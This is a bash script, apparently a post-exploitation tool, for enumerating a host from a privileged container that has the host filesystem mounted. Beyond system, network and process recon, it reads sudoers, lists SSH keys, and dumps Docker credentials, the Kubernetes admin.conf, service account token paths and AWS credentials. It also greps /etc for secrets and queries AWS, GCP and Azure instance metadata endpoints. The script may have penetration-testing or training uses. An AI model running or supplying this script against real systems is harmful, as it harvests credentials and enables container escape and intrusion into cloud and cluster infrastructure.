#!/bin/bash
# Comprehensive Host System Enumeration
# Run from privileged container with /host mount

echo "=========================================="
echo "  HOST SYSTEM ENUMERATION"
echo "=========================================="
echo ""

echo "=== 1. SYSTEM INFORMATION ==="
echo "[*] Operating System:"
chroot /host cat /etc/os-release 2>/dev/null | head -10
echo ""

echo "[*] Kernel Version:"
chroot /host uname -a 2>/dev/null
echo ""

echo "[*] Hostname:"
chroot /host hostname 2>/dev/null
echo ""

echo "[*] Uptime:"
chroot /host uptime 2>/dev/null
echo ""

echo "=== 2. NETWORK CONFIGURATION ==="
echo "[*] Network Interfaces:"
cat /host/proc/net/route 2>/dev/null | head -10
echo ""

echo "[*] ARP Table:"
cat /host/proc/net/arp 2>/dev/null
echo ""

echo "[*] Listening Ports (from /proc/net/tcp):"
cat /host/proc/net/tcp 2>/dev/null | awk '{print $2, $10}' | head -20
echo ""

echo "[*] Network Configuration Files:"
ls -la /host/etc/netplan/ 2>/dev/null || ls -la /host/etc/network/ 2>/dev/null || echo "  No network config found"
echo ""

echo "=== 3. USERS AND GROUPS ==="
echo "[*] /etc/passwd:"
chroot /host cat /etc/passwd 2>/dev/null | head -20
echo ""

echo "[*] /etc/group:"
chroot /host cat /etc/group 2>/dev/null | head -20
echo ""

echo "[*] Users with shells:"
chroot /host grep -E "/bin/(bash|sh|zsh)" /etc/passwd 2>/dev/null
echo ""

echo "[*] Sudoers:"
chroot /host cat /etc/sudoers 2>/dev/null | grep -v "^#" | grep -v "^$" | head -20
echo ""

echo "=== 4. RUNNING PROCESSES ==="
echo "[*] Process List (top 20):"
cat /host/proc/*/comm 2>/dev/null | sort | uniq -c | sort -rn | head -20
echo ""

echo "[*] Process Tree:"
ps aux 2>/dev/null | head -20 || echo "  Cannot list processes"
echo ""

echo "=== 5. INSTALLED SOFTWARE ==="
echo "[*] Package Manager (apt):"
chroot /host dpkg -l 2>/dev/null | head -20 || echo "  dpkg not available"
echo ""

echo "[*] Docker Version:"
chroot /host docker --version 2>/dev/null || echo "  Docker CLI not found"
echo ""

echo "[*] Kubernetes Components:"
chroot /host kubectl version --client 2>/dev/null || echo "  kubectl not found"
ls -la /host/usr/bin/kube* 2>/dev/null | head -10
echo ""

echo "=== 6. DOCKER/KUBERNETES SETUP ==="
echo "[*] Docker Socket:"
ls -la /host/var/run/docker.sock 2>/dev/null || ls -la /host/run/docker.sock 2>/dev/null || echo "  Docker socket not found"
echo ""

echo "[*] Containerd Socket:"
ls -la /host/run/containerd/containerd.sock 2>/dev/null || ls -la /host/var/run/containerd/containerd.sock 2>/dev/null || echo "  Containerd socket not found"
echo ""

echo "[*] Kubernetes Directories:"
ls -la /host/var/lib/kubelet/ 2>/dev/null | head -10 || echo "  Kubelet directory not found"
ls -la /host/etc/kubernetes/ 2>/dev/null | head -10 || echo "  Kubernetes config not found"
echo ""

echo "[*] Service Account Tokens:"
find /host -path "*/serviceaccount/token" 2>/dev/null | head -10
echo ""

echo "=== 7. CREDENTIALS AND SECRETS ==="
echo "[*] SSH Keys:"
ls -la /host/root/.ssh/ 2>/dev/null | head -10 || echo "  No root SSH keys"
find /host/home -name ".ssh" -type d 2>/dev/null | head -10
echo ""

echo "[*] Docker Credentials:"
cat /host/root/.docker/config.json 2>/dev/null | python3 -m json.tool 2>/dev/null || echo "  No Docker config"
find /host/home -name ".docker" -type d 2>/dev/null | head -5
echo ""

echo "[*] Kubernetes Configs:"
find /host -path "*/.kube/config" 2>/dev/null | head -10
find /host -name "kubeconfig" 2>/dev/null | head -10
cat /host/etc/kubernetes/admin.conf 2>/dev/null | head -5 || echo "  No admin.conf"
echo ""

echo "[*] AWS Credentials:"
find /host -name ".aws" -type d 2>/dev/null | head -5
cat /host/root/.aws/credentials 2>/dev/null | head -10 || echo "  No AWS credentials"
echo ""

echo "[*] Environment Files with Secrets:"
find /host -name ".env" -type f 2>/dev/null | head -10
grep -r "PASSWORD\|SECRET\|API_KEY\|TOKEN" /host/etc 2>/dev/null | head -10 || echo "  No obvious secrets in /etc"
echo ""

echo "=== 8. SCHEDULED TASKS ==="
echo "[*] Crontab:"
chroot /host cat /etc/crontab 2>/dev/null | grep -v "^#" | grep -v "^$" || echo "  No crontab"
echo ""

echo "[*] User Crontabs:"
ls -la /host/var/spool/cron/crontabs/ 2>/dev/null | head -10 || echo "  No user crontabs"
echo ""

echo "[*] Systemd Timers:"
chroot /host systemctl list-timers 2>/dev/null | head -20 || echo "  Cannot list timers"
echo ""

echo "=== 9. MOUNTED FILESYSTEMS ==="
echo "[*] Mounts:"
cat /host/proc/mounts 2>/dev/null | grep -v "^#" | head -20
echo ""

echo "[*] Disk Usage:"
chroot /host df -h 2>/dev/null | head -20 || echo "  Cannot check disk usage"
echo ""

echo "=== 10. SYSTEMD SERVICES ==="
echo "[*] Running Services:"
chroot /host systemctl list-units --type=service --state=running 2>/dev/null | head -20 || echo "  Cannot list services"
echo ""

echo "[*] Docker Service:"
chroot /host systemctl status docker 2>/dev/null | head -10 || echo "  Cannot check Docker service"
echo ""

echo "=== 11. LOG FILES ==="
echo "[*] Recent Auth Logs:"
chroot /host tail -20 /var/log/auth.log 2>/dev/null || chroot /host tail -20 /var/log/secure 2>/dev/null || echo "  No auth logs accessible"
echo ""

echo "[*] Docker Logs Location:"
ls -la /host/var/lib/docker/containers/ 2>/dev/null | head -5 || echo "  Docker containers directory not found"
echo ""

echo "=== 12. CLOUD METADATA ==="
echo "[*] AWS Metadata:"
curl -s --max-time 2 http://169.254.169.254/latest/meta-data/ 2>/dev/null | head -10 || echo "  Not AWS or metadata not accessible"
echo ""

echo "[*] GCP Metadata:"
curl -s --max-time 2 -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/ 2>/dev/null | head -10 || echo "  Not GCP or metadata not accessible"
echo ""

echo "[*] Azure Metadata:"
curl -s --max-time 2 -H "Metadata: true" http://169.254.169.254/metadata/instance?api-version=2021-02-01 2>/dev/null | head -5 || echo "  Not Azure or metadata not accessible"
echo ""

echo "=========================================="
echo "  ENUMERATION COMPLETE"
echo "=========================================="
